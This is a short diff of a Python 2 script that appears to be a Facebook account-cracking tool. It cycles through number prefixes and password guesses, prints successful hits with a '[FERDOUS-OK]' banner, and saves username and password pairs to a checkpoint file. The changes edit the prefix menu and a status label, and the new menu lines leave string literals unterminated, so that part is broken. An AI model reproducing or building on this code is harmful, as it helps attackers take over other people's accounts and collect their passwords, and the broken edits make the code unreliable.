@@ -118,8 +118,8 @@ def action():
         print logo
         print 50* '-'
         print ''
-        print '170,171, 172, 173, 174, 175, 176, 177, 178, 179,130'
-        print '131, 132, 133, 134, 135, 136, 137, 138, 139'
+        print '170, TYPE 170
+        print '
         print ''
         try:
             c = raw_input(' Choose Code  : ')
@@ -250,7 +250,7 @@ def action():
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;93m[FERDOUS-OK]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Login 7 Days]\x1b[0m \n'
+                print '\x1b[1;93m[FERDOUS-OK]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Login Just Now]\x1b[0m \n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '|' + pass1 + '\n')
                 cps.close()
